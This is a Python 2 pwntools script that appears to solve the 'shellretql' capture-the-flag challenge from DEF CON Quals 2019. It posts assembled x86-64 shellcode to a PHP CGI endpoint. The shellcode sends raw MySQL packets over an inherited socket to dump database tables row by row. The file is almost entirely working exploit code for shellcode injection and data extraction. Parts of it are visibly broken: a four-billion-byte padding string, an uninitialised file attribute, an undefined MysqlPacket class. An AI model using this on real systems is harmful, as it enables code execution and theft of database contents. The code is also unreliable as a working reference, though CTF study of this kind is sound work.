#!/usr/bin/env python2
from pwn import *
import requests
import re
import unicodedata

context.arch = "amd64"
context.os = "linux"


class TableDumper:

    def __init__(self, outfile_path=None):
        self.host = "http://shellretql.quals2019.oooverflow.io:9090/"
        self.path = "cgi-bin/index.php"
        self.url = self.host + self.path
        self.html = (
            'X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\n'
            'Content-Type: text/html; charset=UTF-8\r\n\r\n'
            'x'
        )
        self.delim = 'scc'
        self.count_q = "select '{delim}',count({col}),'{delim2}' FROM {tbl};"
        self.cell_q = "select '{delim}',{col},'{delim2}' FROM {tbl} LIMIT 1 OFFSET {off};"
        self.encod = 'utf8'
        self.data = None
        self.last_r = None
        self.table_len = 0
        self.file_mode = 'a+'
        self.outfile_path = outfile_path
        self.outfile = None
        self.err_string = 'Error'
        if self.outfile_path:
            self.get_file()
        self.VERBOSE = False

    def get_file(self):
        if self.file:
            self.file.close()
        self.file = open(self.outfile_path, self.file_mode)

    def write_line(self, line):
        self.file.write(line)

    def build_q(self, q, x, y):
        # print q
        shellcode = ""
        shellcode += shellcraft.echo(p16(len(q)) + "\x00\x00\x03" + q, 4)
        shellcode += shellcraft.read(4, 'rsp', x)
        shellcode += shellcraft.pushstr(self.html)
        shellcode += shellcraft.write(1, 'rsp', y)
        self.data = {
            "shell": 'A'*4000000000 + asm(shellcode) + "\x00"
        }
        return self.data

    def do_request(self):
        # if self.VERBOSE:
        #    print '[+] Query: {}'.format(self.data['shell'])
        print 'posting request...'
        self.last_r = requests.post(self.url, data=self.data, headers={'User-Agent': 'SCC Browser'})
        print 'post complete'
        return self.last_r

    def do_query(self, q, x=200, y=500):
        self.build_q(q, x, y)
        return self.do_request()

    def get_result(self, q):
        res = self.do_query(q)
        # kills unicode bytes
        res = unicodedata.normalize('NFKD', res.text).encode('ascii', 'ignore')
        res = MysqlPacket(res, self.encod).dump()
        try:
            r = res.split(self.delim)[2].split(self.delim[::-1])[0]
        except IndexError:
            r = 'IndexError :/'
        return r

    def trim(self, s):
        while s.startswith('.'):
            s = s[1:]
        while s.endswith('.'):
            s = s[:-1]
        if '...' in s:
            s = s.split('...')[0]
        return s

    def get_count(self, tbl, col, set_table_len=False):
        c = self.get_result(self.count_q.format(
            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl
        ))
        c = int(self.trim(c))
        if set_table_len:
            self.table_len = c
            print '{} number of records in tbl {}'.format(c, tbl)
        return c

    def get_cell(self, tbl, col, off):
        q = self.cell_q.format(
            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl, off=off
        )
        res = self.get_result(q)
        while self.err_string in res:
            res = self.get_result(q)
        return res

    def dump_col(self, tbl, col):
        self.get_count(tbl, col, set_table_len=True)
        for off in range(self.table_len):
            r = self.get_cell(tbl, col, off)
            # print self.trim(r)

    def dump_row(self, tbl, cols, off=0):
        row = []
        assert(isinstance(row, list))
        for col in cols:
            row.append(self.trim(self. get_cell(tbl, col, off)))
        return row

    def dump_table(self, tbl, cols):
        self.get_count(tbl, cols[0], True)
        for off in range(self.table_len):
            r = self.dump_row(tbl, cols, off)
            line = StringIO.StringIO()
            writer = csv.writer(line)
            writer.writerow(r)
            print line.getvalue().strip()


def check(c):
    if ord(c) < 32 or ord(c) >= 127:
        return '.'
    else:
        return c


def display(x):
    for y in range(0, len(x), 16):
        if all([z == '\x00' for z in x[y:y+16]]):
            continue
        print ' '.join([z.encode('hex') for z in x[y:y+8]]), ' ' + \
              ' '.join([z.encode('hex') for z in x[y+8:y+16]]) + \
              ' ' * 5 + \
              ''.join([check(z) for z in x[y:y+8]]) + \
              ' ' + \
              ''.join([check(z) for z in x[y+8:y+16]])
    print len(x)


if __name__ == '__main__':
    a = TableDumper()
    #rc = 500
    # while rc == 500:
    res = a.do_query("select '" + 'A' + "' from PlrNote limit 1;", y=1000)
    rc = res.status_code
    res = res.content
    display(res)
